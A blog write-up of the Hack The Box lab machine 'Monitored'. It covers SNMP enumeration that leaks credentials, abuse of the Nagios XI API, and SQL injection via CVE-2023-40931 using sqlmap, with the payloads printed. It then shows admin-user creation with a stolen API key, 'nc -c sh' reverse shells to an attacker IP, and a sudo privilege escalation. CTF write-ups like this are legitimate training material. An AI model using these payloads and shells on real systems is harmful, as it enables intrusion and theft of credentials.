---
title: Monitored Writeup
date: 2024-02-13 17:50 +0100
author: Kyllano
categories: [HTB Writeup]
tags: [cybersecurity, htb, writeup]
---

## Enumeration

Let's first do all the classic recon :

- nmap (with Version detection and basic script for all ports) :

<img src="/assets/img/MonitoredWriteup/mon1.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>

- Subdirectory listings :

Using `./ffuf -u "https://nagios.monitored.htb/FUZZ" -w ../directories.txt` only reveal one directory `nagios` which is not much so let's continue to enumerate the directories inside `nagios` :

<img src="/assets/img/MonitoredWriteup/mon2.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>


If we visit the `terminal` page, there is a command line interface, but without credential wa cannot get in. We are forbidden to access most of this and furter directory lsiting does not gives nomehing interesting. If we enumerate the `api` directory though, we will get a `v1` folder. Knowing that `nagios` is a solution that uses `SNMP` to manage devices, we can assume that it uses `SNMP v1` (more on this later)

We did not get much with our classic TCP nmap scan. However, if we do a UDP nmap scan we might get something different . We use -sU to toggle UDP and -T4 to make it faster since a UDP scan is veeeeery slow. We have :

```
kyll@kyll-Latitude-3520:~/Desktop/code_folder/Software_exploitation/HTB$ sudo nmap -sU -sC -sV -T4 -Pn -p-10000 10.10.11.248
[...]
PORT    STATE SERVICE VERSION
123/udp open  ntp     NTP v4 (unsynchronized)
| ntp-info: 
|_  
161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
| snmp-info: 
|   enterprise: net-snmp
[...]
|_    Traffic stats: 3.23 Gb sent, 1.30 Gb received
| snmp-netstat: 
|   TCP  0.0.0.0:22           0.0.0.0:0
[...]
|_  UDP  127.0.0.1:123        *:*
| snmp-processes: 
|   1: 
|     Name: systemd
[...]
162/udp open  snmp    net-snmp; net-snmp SNMPv3 server
| snmp-info: 
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: 5a44ab2146ff4c6500000000
|   snmpEngineBoots: 26
|_  snmpEngineTime: 1d05h16m55s
Service Info: Host: monitored
```

The important thing in that scan is that we have found that SNMP is running which will be our target for our next enumeration step.

## SNMP walk get svc

### A word about SNMP

Here we have SNMP running on port 161, but what is SNMP? From [this website](https://blog.invgate.com/what-is-snmpwalk) :

> SNMP or Simple Network Management Protocol is an application-layer Internet Standard protocol used for managing information about devices on an IP network [...]. The protocol lets devices on the same network communicate with each other and is commonly used for collecting information about the health and status of the devices on the network

SNMP uses different types of request (_GetRequest_, _GetNextRequest_, _SetRequest_ etc.). Doing an SNMP walk consist in sending a _GetNextRequest_ (that will ask for the label of the next variable that is present in the network) to the agent (the managed machine) and then sending a _GetRequest_ (which will send the value of the variable demanded). We do this until no more labels are given and then we'll have all the publicly available variable content.

In order to do that SNMP walk, we can use this command `snmpwalk -v1 -c public 10.10.11.248`. `snmpwalk`is present in the `snmp` package, `-c` to indicate the community string which by default is "public" unless configured differently (hopefully it's not). Also we can deduct that the version of SNMP used is `v1` since we've found the directory `nagiosxi/api/v1/` 

The SNMP walk is also really long and slow, so here's the important part of the walk :

```
[...]
iso.3.6.1.2.1.25.4.2.1.5.1410 = STRING: "-u svc /bin/bash -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB"
iso.3.6.1.2.1.25.4.2.1.5.1411 = STRING: "-c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB"
iso.3.6.1.2.1.25.4.2.1.5.1425 = STRING: "-bd -q30m"
[...]
```

From our walk, we've gotten the string `-c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB`. `svc` is a common username and the password of that user is `XjH7VCehowpR1xZB`.

### Stealing a auth token

I haven't been able to use the password and username through the login portal nor through the `terminal` webpage. But, with a little bit more enumeration with ffuf :

```
kyll@kyll-Latitude-3520:~/Desktop/code_folder/Tools/ffuf$ ./ffuf -u "https://nagios.monitored.htb/nagiosxi/api/v1/FUZZ" -mc 200 -fs 32 -w ../directories.txt 
[...]
________________________________________________
license                 [Status: 200, Size: 34, Words: 3, Lines: 2, Duration: 494ms]
authenticate            [Status: 200, Size: 53, Words: 7, Lines: 2, Duration: 726ms]
```

Here, we have to use `-fs 32` in order to filter out all the request the returns 32 octet since all the request to `https://nagios.monitored.htb/nagiosxi/api/v1/XXXXX` return 32 byte with a `200 : OK` saying `no api key provided` :

<img src="/assets/img/MonitoredWriteup/mon3.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>

So we found the `authenticate` directory and when we visit the page, we find :

<img src="/assets/img/MonitoredWriteup/mon3-5.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>

If we try to send a POST request as requested (`-X POST` to specify a post request, `-k` to specify that we don't need to validate certificate since it has been self signed), we get the following :

```
kyll@kyll-Latitude-3520:~/Desktop/code_folder/Software_exploitation/HTB$ curl -k -X POST "https://nagios.monitored.htb/nagiosxi/api/v1/authenticate"
{"error":"Must be valid username and password."}
```

It says that we need to provide a username and password, so let's provide the ones we found in our SNMP walk (use `-d` in order to add a `data` field to the POST request:

```
kyll@kyll-Latitude-3520:~/Desktop/code_folder/Software_exploitation/HTB$ curl -k -X POST "https://nagios.monitored.htb/nagiosxi/api/v1/authenticate" -d "username=svc&password=XjH7VCehowpR1xZB"
{"username":"svc","user_id":"2","auth_token":"ffedddd49d7af30330ef07470be860eff10d3509","valid_min":5,"valid_until":"Sat, 10 Feb 2024 17:09:42 -0500"}
```

This gives us an `auth_token`. We can use that authentication token in order to get access to SVC's web portal. If we look at the [documentation of Nagios XI API](https://www.nagios.org/ncpa/help/2.0/api.html), we see that we can add the `?token=mytoken` argument into our searchbar. So let's do that in the base nagiosxi webpage :

<img src="/assets/img/MonitoredWriteup/mon4.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>

Great, we have access to SVC's web portal.

## Exploiting Nagios XI

Nagios XI version 5.11.0 has one big vulnerability and it is called [CVE-2023-40931](https://www.cvedetails.com/cve/CVE-2023-40931/). As a user, it is possible to "acknowledge" the reception of a banner situated at `/nagiosxi/admin/banner_message-ajaxhelper.php`. When acknowledging that banner, we would normally need to include the following data `action=acknowledge_banner_message&id=3`. This data is supposed to be trusted, but it comes directly from the client, meaning that it can be modified into a different request.  It is said in the [Vulnerability description](https://outpost24.com/blog/nagios-xi-vulnerabilities/) that it lets us retrieve data from the `xi_session` and `xi_users` table. The `xi_session` probably only contains session logs or maybe session cookies, but `xi_user` looks interesting.

This vulnerability works only once a user is connected (thankfully we did it earlier), meaning that we need to steal the session cookies from our browser :

<img src="/assets/img/MonitoredWriteup/mon4-5.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>

I cannot for the life of me try to craft those SQL injections myself (I simply do not know how to do that). But there is a tool that can do that for us : SQLMaps

We have the `-u` option to the path of the banner as specified in the vulnerability description and the specific data with the `--data` flag. Als specify the cookie found with `--cookie`. Looking at this [blog post](https://support.nagios.com/forum/viewtopic.php?t=65697), it looks like the database is called `nagiosxi` (since he tries to call to the table `nagiosxi.xi_users`) so we'll add `-D nagiosxi` to specify the database and `-T xi_users` to specify the table. Which gives us this command (do not forget the `--dump` in order to dump the database) :

```
kyll@kyll-Latitude-3520:~/Desktop/code_folder/Tools$ python3 sqlmap-dev/sqlmap.py -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php" --data="id=3&action=acknowledge_banner_message" --cookie "nagiosxi=abpl48o1iaju8hk9mch8bdiram" -D nagiosxi -T xi_users --dump
[...]
---
Parameter: id (POST)
    Type: boolean-based blind
    Title: Boolean-based blind - Parameter replace (original value)
    Payload: action=acknowledge_banner_message&id=(SELECT (CASE WHEN (5098=5098) THEN 3 ELSE (SELECT 3612 UNION SELECT 4434) END))

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: action=acknowledge_banner_message&id=3 OR (SELECT 6614 FROM(SELECT COUNT(*),CONCAT(0x7170717171,(SELECT (ELT(6614=6614,1))),0x7170717671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: time-based blind
    Title: MySQL > 5.0.12 OR time-based blind (heavy query)
    Payload: action=acknowledge_banner_message&id=3 OR 4063=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)
---
[...]
```

Thank god I did not have to find nor understand the query `action=acknowledge_banner_message&id=3 OR (SELECT 6614 FROM(SELECT COUNT(*),CONCAT(0x7170717171,(SELECT (ELT(6614=6614,1))),0x7170717671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)`.

After that SQLMaps dumps the database :

<img src="/assets/img/MonitoredWriteup/mon5.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>

When sanitized into some proper markdown, the data looks like this :

| user_id | email                  | name                 | api_key                                                          | enabled | password                                                     | username        | created_by | last_login | api_enabled |
|---------|------------------------|----------------------|------------------------------------------------------------------|---------|--------------------------------------------------------------|-----------------|------------|------------|-------------|
| 1       | admin@monitored.htb    | Nagios Administrator | IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL | 1       | $2a$10$825c1eec29c150b118fe7unSfxq80cf7tHwC0J0BG2qZiNzWRUx2C | nagiosadmin     | 0          | 1701931372 | 1           |
| 2       | svc@monitored.htb      | svc                  | 2huuT2u2QIPqFuJHnkPEEuibGJaJIcHCFDpDb29qSFVlbdO4HJkjfg2VpDNE3PEK | 0       | $2a$10$12edac88347093fcfd392Oun0w66aoRVCrKMPBydaUfgsgAOUHSbK | svc             | 1          | 1699724476 | 1           |
| 6       | test@monitored.htb     | Test User            | a4Cve9LiACVuW7NbFP9ai3A7pNBbXY678pQe9p774KnpACUutdOqYeR56i27icgX | 1       | $2a$10$f55c6e500c49efffe86a0ugKZx2Jg/aZYxTlKcFbGs4lyJ/VDjmju | test            | 0          | 1707463648 | 0           |
| 7       | newemail@monitored.htb | Grave Reaper         | ZQBQ54PBjrYQuvimhb06SqomLf72O0npKt8I8DeeTU6MOZSGti7vngndBnOdokaR | 1       | $2a$10$bff50327ea1b460b413aeu3OR5YHOc1WKo.wpZWZFbDKz3WGmGqYC | gravereaper2038 | 0          | 1707465470 | 0           |
| 8       | hacker@man.htb         | Hackerman            | AeAISjMlJVKJu5NIhOXaLMGegg3GRqnSDkHM40bVdUaS06HqK3YB9FcrvjNbVDiJ | 1       | $2a$10$c5a71727e87549214bfb5uqYUO8ZBerSbsDFIz08OAOnYA4/H/d06 | hackerman       | 0          | 1707485526 | 0           |

Looks like from this we've gotten an admin API key and password hashes, which will be our leverage point to get a user with admin right.

## Creating admin user with the stolen API key and getting a reverse shell

We could try to crack the administrator password thta we've found, but we can do much better with that API key. We're able to create a user with admin right if we follow this [forum post](https://support.nagios.com/forum/viewtopic.php?t=42923). So let's do as they say in the post and provide a username, password, name and email. Also we have to add the `auth_level=admin` field in order to create an admin : 

<img src="/assets/img/MonitoredWriteup/mon6.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>

_Note_ : If you ever need to delete a user that you've created or want to mess with your coworkers and gaslight them into thinking that the user they've created have somehow vanished, you can use the procedure in [this post](https://support.nagios.com/forum/viewtopic.php?t=38605) to delete the user :). (Promise I have not done it, I just thought it could be funny)

Let's try to connect to our user `unebonnenote` with password `stp` now :

<img src="/assets/img/MonitoredWriteup/mon11.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>

With our admin power, it is now possible for us to get into the machine by accessing the `Command` panel and adding our reverse shell command crafted [here](https://www.revshells.com/) (`nc -c sh 10.10.14.134 6969`) :

<img src="/assets/img/MonitoredWriteup/mon7.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>

 We then need to run a service that will execute that command, so let's create one in the `service management` tab :

<img src="/assets/img/MonitoredWriteup/mon8.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>

If we click on `run check command`, our command should execute, if we look to our terminal waiting for the reverse shell to connect :

<img src="/assets/img/MonitoredWriteup/mon9.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>

That's the user flag caught! We can stabilise the shell using [this trick](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)

## Privesc

We first do a `sudo -l` to check what we can run as root :

```
nagios@monitored:/home/nagios $ sudo -l
Matching Defaults entries for nagios on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User nagios may run the following commands on localhost:
    (root) NOPASSWD: /etc/init.d/nagios start
    (root) NOPASSWD: /etc/init.d/nagios stop
    (root) NOPASSWD: /etc/init.d/nagios restart
    (root) NOPASSWD: /etc/init.d/nagios reload
    (root) NOPASSWD: /etc/init.d/nagios status
    (root) NOPASSWD: /etc/init.d/nagios checkconfig
    (root) NOPASSWD: /etc/init.d/npcd start
    (root) NOPASSWD: /etc/init.d/npcd stop
    (root) NOPASSWD: /etc/init.d/npcd restart
    (root) NOPASSWD: /etc/init.d/npcd reload
    (root) NOPASSWD: /etc/init.d/npcd status
    (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/components/autodiscover_new.php *
    (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/send_to_nls.php *
    (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/migrate/migrate.php *
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/components/getprofile.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/upgrade_to_latest.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/change_timezone.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_services.sh *
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/reset_config_perms.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_ssl_config.sh *
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/backup_xi.sh *


```

Out of all of these program, `manage_service.sh` lets use `start`, `stop` `restart` `reload` and use more commands on the service `npcd` . A look at the script tells us that the service file is located at `/usr/local/bin/npcd`. If we modify the file with the following code :

```bash
#!/bin/bash

nc -c sh 10.10.14.134 6968
```

Now let's do a `sudo manage_service.sh stop npcd` and then a `sudo manage_service.sh start npcd`. And check our terminal waiting for another reverse shell :

<img src="/assets/img/MonitoredWriteup/mon10.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>

And that's the root flag!

